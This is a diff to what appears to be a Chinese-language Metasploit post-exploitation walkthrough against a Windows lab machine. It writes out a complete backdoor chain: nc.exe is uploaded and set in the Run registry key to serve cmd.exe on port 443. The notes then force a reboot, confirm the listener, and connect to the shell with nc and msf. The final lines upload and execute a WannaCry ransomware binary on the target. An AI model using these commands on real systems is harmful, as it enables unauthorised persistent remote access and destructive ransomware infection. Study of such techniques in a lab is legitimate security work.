@@ -125,6 +125,39 @@ msf6 exploit(windows/smb/psexec) > run
 把nc.exe上传靶机，并开机启动
 meterpreter > upload /usr/share/windows-binaries/nc.exe C:\\windows
 meterpreter > reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d 'C:\windows\nc.exe -Ldp 443 -e cmd.exe'
+下次开机会启动，不能立即生效
+
+meterpreter > shell
+C:\Windows\system32>shutdown -r -f -t 0
+-r 重启
+-f 强制
+-t 时间为0，立即执行
+
+或者用这个更好
+meterpreter > reboot
+重启时，会话会断开
+
+可以查下靶机nc是否启动
+meterpreter > shell
+C:\Windows\system32>netstat -an | findstr "443"
+
+nc连接靶机
+nc -v 10.211.55.4 443
+不用msf也可以连接
+连接成功显示：
+C:\Windows\SysWOW64>
+
+msf连接
+msf6 > connect 10.211.55.4 443
+C:\Windows\SysWOW64>
+
+####上传勒索病毒
+C:\Windows\SysWOW64>upload wannacry.exe c:\
+上传勒索文件至c盘
+execute -f c:\wannacry.exe
+执行
+
+
 
 
 
